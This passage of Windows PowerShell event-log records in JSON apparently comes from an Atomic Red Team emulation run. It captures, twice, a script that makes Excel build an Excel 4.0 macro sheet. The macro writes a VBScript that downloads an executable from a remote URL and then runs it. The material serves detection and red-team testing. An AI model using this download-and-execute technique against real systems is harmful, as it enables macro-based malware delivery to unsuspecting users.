$fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=6c0f7ff3-c605-473a-99ec-2e4207c8e4ed\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:13:59.0185947"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=92f42e6a-45f1-4315-9d7f-79063b498629\r\n\tHostApplication=powershell.exe &amp; {$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\r\n$fname1 = \"$env:TEMP\\procexp.exe\"\r\nif (Test-Path $fname) {\r\n Remove-Item $fname\r\n Remove-Item $fname1\r\n}\r\n\r\n$xlApp = New-Object -COMObject \"Excel.Application\"\r\n$xlApp.Visible = $True\r\n$xlApp.DisplayAlerts = $False\r\n$xlBook = $xlApp.Workbooks.Add()\r\n$sheet = $xlBook.Excel4MacroSheets.Add()\r\n\r\nif (\"$env:Username\" -ne \"\") {\r\n $sheet.Cells.Item(1,1) = \"$env:Username\"\r\n} else {\r\n $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\r\n}\r\n\r\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\r\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\r\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\r\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\", 3)\"\r\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"\r\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\r\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\r\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\r\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\r\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\r\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\r\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\r\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\r\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\r\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\"`\", 2`\")\"\r\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\r\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\r\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\r\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A3&amp;`\"`\")\"\r\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\r\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&amp;A1&amp;`\"\\AppData\\Local\\Temp\\`\"&amp;A2&amp;`\"`\")\"\r\n$sheet.Cells.Item(23,1) = \"=HALT()\"\r\n$sheet.Cells.Item(1,1).Name = \"runme\"\r\n$xlApp.Run(\"runme\")\r\n$xlApp.Quit()\r\n\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\r\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\r\n[System.GC]::Collect()\r\n[System.GC]::WaitForPendingFinalizers()\r\n\r\nRemove-Variable xlBook\r\nRemove-Variable xlApp}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=6c0f7ff3-c605-473a-99ec-2e4207c8e4ed\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
